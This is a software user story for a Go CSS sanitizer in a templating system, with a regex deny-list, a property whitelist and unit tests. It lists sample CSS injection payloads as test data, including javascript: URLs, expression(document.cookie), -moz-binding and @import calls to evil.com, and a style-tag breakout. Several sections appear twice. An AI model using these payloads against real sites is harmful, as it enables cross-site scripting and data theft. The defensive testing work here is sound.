# User Story: CSS Sanitization

**Epic:** [06_EPIC_templates.md](06_EPIC_templates.md)
**Priority:** High
**Status:** Not Started
**Estimated Effort:** 1 day

---

## User Story

As a **security-conscious administrator**, I want **CSS sanitization in templates** so that **malicious CSS cannot execute JavaScript or compromise security**.

are there any standard packages that do this? 

---

## Acceptance Criteria

- [ ] CSS sanitizer service created
- [ ] JavaScript URLs in CSS blocked
- [ ] CSS expression() blocked (IE legacy)
- [ ] External @import blocked
- [ ] Behavior property blocked (IE legacy)
- [ ] Data URLs in CSS sanitized
- [ ] Whitelist approach for safe properties
- [ ] CSS validation on template upload
- [ ] CSS validation on template update
- [ ] All tests pass with timeout
- [ ] Security tests verify CSS injection prevented

---

## Technical Details

### CSS Sanitizer

```go
package templates

import (
    "fmt"
    "regexp"
    "strings"
)

type CSSSanitizer interface {
    Sanitize(css string) (string, error)
    Validate(css string) error
}

type cssSanitizer struct {
    dangerousPatterns []*regexp.Regexp
    allowedProperties map[string]bool
}

func NewCSSSanitizer() CSSSanitizer {
    return &cssSanitizer{
        dangerousPatterns: compileDangerousPatterns(),
        allowedProperties: getAllowedProperties(),
    }
}

func compileDangerousPatterns() []*regexp.Regexp {
    patterns := []string{
        `javascript\s*:`,
        `expression\s*\(`,
        `behavior\s*:`,
        `@import`,
        `<script`,
        `</script`,
        `vbscript\s*:`,
        `data\s*:\s*text/html`,
        `-moz-binding`,
        `@charset`,
    }
    
    compiled := make([]*regexp.Regexp, len(patterns))
    for i, pattern := range patterns {
        compiled[i] = regexp.MustCompile(`(?i)` + pattern)
    }
    
    return compiled
}

func (s *cssSanitizer) Validate(css string) error {
    for _, pattern := range s.dangerousPatterns {
        if pattern.MatchString(css) {
            return &ValidationError{
                Field:   "css_content",
                Message: fmt.Sprintf("CSS contains dangerous pattern: %s", pattern.String()),
            }
        }
    }
    
    return nil
}

func (s *cssSanitizer) Sanitize(css string) (string, error) {
    if err := s.Validate(css); err != nil {
        return "", err
    }
    
    css = removeComments(css)
    css = normalizeWhitespace(css)
    
    return css, nil
}
```

### Dangerous CSS Patterns

#### 1. JavaScript URLs

```css
/* Blocked */
background: url(javascript:alert('xss'));
background-image: url('javascript:alert("xss")');
```

#### 2. CSS Expression (IE)

```css
/* Blocked */
width: expression(alert('xss'));
height: expression(document.cookie);
```

#### 3. Behavior Property (IE)

```css
/* Blocked */
behavior: url(xss.htc);
```

#### 4. External Imports

```css
/* Blocked */
@import url('https://evil.com/malicious.css');
@import 'https://evil.com/steal-data.css';
```

#### 5. Data URLs with HTML

```css
/* Blocked */
background: url('data:text/html,<script>alert("xss")</script>');
```

#### 6. Mozilla Binding

```css
/* Blocked */
-moz-binding: url('http://evil.com/xss.xml#xss');
```

### Safe CSS Properties Whitelist

```go
func getAllowedProperties() map[string]bool {
    return map[string]bool{
        // Layout
        "display":         true,
        "position":        true,
        "top":             true,
        "right":           true,
        "bottom":          true,
        "left":            true,
        "float":           true,
        "clear":           true,
        "z-index":         true,
        
        // Box Model
        "width":           true,
        "height":          true,
        "max-width":       true,
        "max-height":      true,
        "min-width":       true,
        "min-height":      true,
        "margin":          true,
        "margin-top":      true,
        "margin-right":    true,
        "margin-bottom":   true,
        "margin-left":     true,
        "padding":         true,
        "padding-top":     true,
        "padding-right":   true,
        "padding-bottom":  true,
        "padding-left":    true,
        
        // Typography
        "font-family":     true,
        "font-size":       true,
        "font-weight":     true,
        "font-style":      true,
        "line-height":     true,
        "text-align":      true,
        "text-decoration": true,
        "text-transform":  true,
        "letter-spacing":  true,
        "word-spacing":    true,
        
        // Colors
        "color":           true,
        "background":      true,
        "background-color": true,
        "border-color":    true,
        
        // Borders
        "border":          true,
        "border-width":    true,
        "border-style":    true,
        "border-radius":   true,
        "border-top":      true,
        "border-right":    true,
        "border-bottom":   true,
        "border-left":     true,
        
        // Visual
        "opacity":         true,
        "visibility":      true,
        "overflow":        true,
        "box-shadow":      true,
        "text-shadow":     true,
    }
}
```

---

## Tasks

### Phase 1: Sanitizer Implementation (TDD)
- [ ] Define CSSSanitizer interface
- [ ] Write test for Validate with safe CSS
- [ ] Write test for Validate with javascript: URL
- [ ] Write test for Validate with expression()
- [ ] Write test for Validate with @import
- [ ] Write test for Validate with behavior
- [ ] Write test for Validate with data: URL
- [ ] Write test for Sanitize method
- [ ] Implement Validate and Sanitize
- [ ] Run tests (should pass)

### Phase 2: Pattern Detection (TDD)
- [ ] Write test for each dangerous pattern
- [ ] Write test for case insensitivity
- [ ] Write test for whitespace variations
- [ ] Write test for encoding attempts
- [ ] Implement pattern matching
- [ ] Run tests (should pass)

### Phase 3: Property Whitelist (TDD)
- [ ] Define allowed properties list
- [ ] Write test for property validation
- [ ] Write test for disallowed properties
- [ ] Implement property checking
- [ ] Run tests (should pass)

### Phase 4: Integration Testing
- [ ] Test CSS sanitization in templates
- [ ] Test with malicious CSS
- [ ] Test with safe CSS
- [ ] Test in multiple browsers
- [ ] Verify no script execution

### Phase 5: Security Audit
- [ ] Review all CSS usage
- [ ] Test all dangerous patterns
- [ ] Document security measures
- [ ] Create CSS security checklist

---

## Dangerous CSS Patterns

### Pattern 1: JavaScript URLs

```css
/* Attack */
background: url(javascript:alert('xss'));

/* Detection */
(?i)javascript\s*:

/* Result */
Blocked with validation error
```

### Pattern 2: CSS Expression

```css
/* Attack */
width: expression(alert('xss'));

/* Detection */
(?i)expression\s*\(

/* Result */
Blocked with validation error
```

### Pattern 3: Behavior Property

```css
/* Attack */
behavior: url(xss.htc);

/* Detection */
(?i)behavior\s*:

/* Result */
Blocked with validation error
```

### Pattern 4: External Import

```css
/* Attack */
@import url('https://evil.com/xss.css');

/* Detection */
(?i)@import

/* Result */
Blocked with validation error
```

### Pattern 5: Data URL with HTML

```css
/* Attack */
background: url('data:text/html,<script>alert("xss")</script>');

/* Detection */
(?i)data\s*:\s*text/html

/* Result */
Blocked with validation error
```

---

## Error Handling

| Error Condition | Error Type | Message |
|----------------|------------|---------|
| JavaScript URL | `ValidationError` | "CSS contains dangerous pattern: javascript:" |
| CSS expression | `ValidationError` | "CSS contains dangerous pattern: expression()" |
| External import | `ValidationError` | "CSS contains dangerous pattern: @import" |
| Behavior property | `ValidationError` | "CSS contains dangerous pattern: behavior:" |
| Data URL HTML | `ValidationError` | "CSS contains dangerous pattern: data:text/html" |

---

## Testing Strategy

### Unit Tests

```go
func TestCSSSanitizer_Validate(t *testing.T) {
    sanitizer := NewCSSSanitizer()
    
    tests := []struct {
        name    string
        css     string
        wantErr bool
        errMsg  string
    }{
        {
            name:    "safe CSS",
            css:     "body { color: blue; font-size: 14px; }",
            wantErr: false,
        },
        {
            name:    "javascript URL",
            css:     "background: url(javascript:alert('xss'));",
            wantErr: true,
            errMsg:  "javascript:",
        },
        {
            name:    "expression",
            css:     "width: expression(alert('xss'));",
            wantErr: true,
            errMsg:  "expression",
        },
        {
            name:    "import",
            css:     "@import url('https://evil.com/xss.css');",
            wantErr: true,
            errMsg:  "@import",
        },
        {
            name:    "behavior",
            css:     "behavior: url(xss.htc);",
            wantErr: true,
            errMsg:  "behavior",
        },
        {
            name:    "data URL html",
            css:     "background: url('data:text/html,<script>alert(1)</script>');",
            wantErr: true,
            errMsg:  "data:text/html",
        },
        {
            name:    "case insensitive javascript",
            css:     "background: url(JaVaScRiPt:alert('xss'));",
            wantErr: true,
            errMsg:  "javascript:",
        },
    }
    
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            err := sanitizer.Validate(tt.css)
            if (err != nil) != tt.wantErr {
                t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
            }
            if tt.wantErr && tt.errMsg != "" {
                if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(tt.errMsg)) {
                    t.Errorf("Error message = %v, want to contain %v", err, tt.errMsg)
                }
            }
        })
    }
}

func TestCSSSanitizer_Sanitize(t *testing.T) {
    sanitizer := NewCSSSanitizer()
    
    tests := []struct {
        name    string
        input   string
        want    string
        wantErr bool
    }{
        {
            name:    "remove comments",
            input:   "body { /* comment */ color: blue; }",
            want:    "body { color: blue; }",
            wantErr: false,
        },
        {
            name:    "normalize whitespace",
            input:   "body  {  color:  blue;  }",
            want:    "body { color: blue; }",
            wantErr: false,
        },
        {
            name:    "reject dangerous",
            input:   "body { behavior: url(xss.htc); }",
            want:    "",
            wantErr: true,
        },
    }
    
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got, err := sanitizer.Sanitize(tt.input)
            if (err != nil) != tt.wantErr {
                t.Errorf("Sanitize() error = %v, wantErr %v", err, tt.wantErr)
            }
            if !tt.wantErr && got != tt.want {
                t.Errorf("Sanitize() = %v, want %v", got, tt.want)
            }
        })
    }
}
```

### Integration Tests

```go
func TestCSSSanitizer_Integration(t *testing.T) {
    sanitizer := NewCSSSanitizer()
    validator := NewValidator(NewRenderer())
    
    template := &models.Template{
        Name:        "Custom Styled",
        Type:        models.TemplateTypeRSVPPage,
        HTMLContent: "<h1>{{.Event.Title}}</h1>",
        CSSContent:  strPtr("body { color: blue; }"),
    }
    
    err := validator.ValidateTemplate(template)
    if err != nil {
        t.Fatalf("ValidateTemplate() error = %v", err)
    }
    
    maliciousTemplate := &models.Template{
        Name:        "Malicious",
        Type:        models.TemplateTypeRSVPPage,
        HTMLContent: "<h1>{{.Event.Title}}</h1>",
        CSSContent:  strPtr("body { behavior: url(xss.htc); }"),
    }
    
    err = validator.ValidateTemplate(maliciousTemplate)
    if err == nil {
        t.Error("Expected validation error for malicious CSS")
    }
}
```

---

## Tasks

### Phase 1: Sanitizer Implementation (TDD)
- [ ] Define CSSSanitizer interface
- [ ] Write test for Validate with safe CSS
- [ ] Write test for Validate with javascript: URL
- [ ] Write test for Validate with expression()
- [ ] Write test for Validate with @import
- [ ] Write test for Validate with behavior
- [ ] Write test for Validate with -moz-binding
- [ ] Write test for Validate with data:text/html
- [ ] Implement Validate method
- [ ] Run tests (should pass)

### Phase 2: Pattern Detection (TDD)
- [ ] Write test for case insensitivity
- [ ] Write test for whitespace variations
- [ ] Write test for each dangerous pattern
- [ ] Implement pattern matching
- [ ] Run tests (should pass)

### Phase 3: Sanitization (TDD)
- [ ] Write test for Sanitize removing comments
- [ ] Write test for Sanitize normalizing whitespace
- [ ] Write test for Sanitize rejecting dangerous patterns
- [ ] Implement Sanitize method
- [ ] Implement removeComments helper
- [ ] Implement normalizeWhitespace helper
- [ ] Run tests (should pass)

### Phase 4: Integration with Validator (TDD)
- [ ] Update template validator to use CSS sanitizer
- [ ] Write test for template validation with CSS
- [ ] Write test for template validation with malicious CSS
- [ ] Integrate CSS sanitizer
- [ ] Run tests (should pass)

### Phase 5: Security Testing
- [ ] Test all dangerous patterns
- [ ] Test encoding bypass attempts
- [ ] Test case variations
- [ ] Test whitespace variations
- [ ] Document all tested vectors

---

## Dangerous CSS Patterns Reference

### JavaScript Execution

```css
/* Pattern 1: JavaScript URL */
background: url(javascript:alert('xss'));
background-image: url('javascript:alert("xss")');

/* Pattern 2: CSS Expression (IE) */
width: expression(alert('xss'));
height: expression(document.cookie);

/* Pattern 3: Behavior (IE) */
behavior: url(xss.htc);
-ms-behavior: url(xss.htc);

/* Pattern 4: Mozilla Binding */
-moz-binding: url('http://evil.com/xss.xml#xss');
```

### External Resource Loading

```css
/* Pattern 5: Import */
@import url('https://evil.com/xss.css');
@import 'https://evil.com/steal.css';

/* Pattern 6: Data URL with HTML */
background: url('data:text/html,<script>alert("xss")</script>');
```

### Script Tags in CSS

```css
/* Pattern 7: Script tags */
content: '</style><script>alert("xss")</script>';
```

---

## Safe CSS Examples

### Allowed Styling

```css
/* Typography */
body {
    font-family: Arial, sans-serif;
    font-size: 16px;
    line-height: 1.6;
    color: #333;
}

/* Layout */
.container {
    max-width: 600px;
    margin: 0 auto;
    padding: 20px;
}

/* Colors and Backgrounds */
.header {
    background-color: #007bff;
    color: white;
}

/* Borders and Shadows */
.card {
    border: 1px solid #ddd;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

/* Responsive */
@media (max-width: 768px) {
    .container {
        padding: 10px;
    }
}
```

---

## Validation Rules

### CSS Size Limit
- Maximum: 50KB
- Error: "CSS content exceeds 50KB"

### Dangerous Patterns
- javascript: URLs → Blocked
- expression() → Blocked
- behavior: → Blocked
- @import → Blocked
- -moz-binding → Blocked
- data:text/html → Blocked
- <script> tags → Blocked

### Allowed Features
- All standard CSS properties
- Media queries
- Pseudo-classes and pseudo-elements
- CSS variables (custom properties)
- Calc() function
- RGB/RGBA/HSL colors
- Gradients (linear, radial)

---

## Error Handling

| Error Condition | Error Type | Message |
|----------------|------------|---------|
| JavaScript URL | `ValidationError` | "CSS contains dangerous pattern: javascript:" |
| CSS expression | `ValidationError` | "CSS contains dangerous pattern: expression()" |
| External import | `ValidationError` | "CSS contains dangerous pattern: @import" |
| Behavior property | `ValidationError` | "CSS contains dangerous pattern: behavior:" |
| Size exceeded | `ValidationError` | "CSS content exceeds 50KB" |

---

## Testing Strategy

### Unit Tests

```go
func TestCSSSanitizer_DangerousPatterns(t *testing.T) {
    sanitizer := NewCSSSanitizer()
    
    dangerousCSS := []struct {
        name string
        css  string
    }{
        {"javascript url", "background: url(javascript:alert('xss'));"},
        {"expression", "width: expression(alert('xss'));"},
        {"behavior", "behavior: url(xss.htc);"},
        {"import", "@import url('https://evil.com/xss.css');"},
        {"moz-binding", "-moz-binding: url('http://evil.com/xss.xml#xss');"},
        {"data html", "background: url('data:text/html,<script>alert(1)</script>');"},
        {"script tag", "content: '</style><script>alert(1)</script>';"},
    }
    
    for _, tc := range dangerousCSS {
        t.Run(tc.name, func(t *testing.T) {
            err := sanitizer.Validate(tc.css)
            if err == nil {
                t.Errorf("Expected validation error for %s", tc.name)
            }
        })
    }
}

func TestCSSSanitizer_SafeCSS(t *testing.T) {
    sanitizer := NewCSSSanitizer()
    
    safeCSS := []string{
        "body { color: blue; }",
        ".container { max-width: 600px; margin: 0 auto; }",
        "h1 { font-size: 24px; font-weight: bold; }",
        ".button { background: #007bff; border-radius: 4px; }",
        "@media (max-width: 768px) { .container { padding: 10px; } }",
    }
    
    for i, css := range safeCSS {
        t.Run(fmt.Sprintf("safe_%d", i), func(t *testing.T) {
            err := sanitizer.Validate(css)
            if err != nil {
                t.Errorf("Validate() error = %v for safe CSS: %s", err, css)
            }
        })
    }
}
```

---

## Dependencies

**Depends on:**
- Story 02: Template Security (for validation framework)

**Blocks:**
- Story 03: Default Templates (must have safe CSS)
- Story 04: Template CRUD (must validate CSS)

---

## Definition of Done

- [ ] All acceptance criteria met
- [ ] CSSSanitizer implemented
- [ ] All dangerous patterns blocked
- [ ] All unit tests passing (>90% coverage)
- [ ] Integration tests passing
- [ ] Security tests passing
- [ ] All dangerous patterns documented
- [ ] Safe CSS examples provided
- [ ] Documentation updated
- [ ] Security review completed

---

## References

- **Epic:** [06_EPIC_templates.md](06_EPIC_templates.md)
- **HLD:** Section 11.4 (Template Security), Section 16.3 (Input Sanitization)
- **LLD:** [lld/06_TEMPLATE_LLD.md](../lld/06_TEMPLATE_LLD.md)
- **OWASP:** https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- **Story 02:** [06_STORY_02_template_security.md](06_STORY_02_template_security.md)
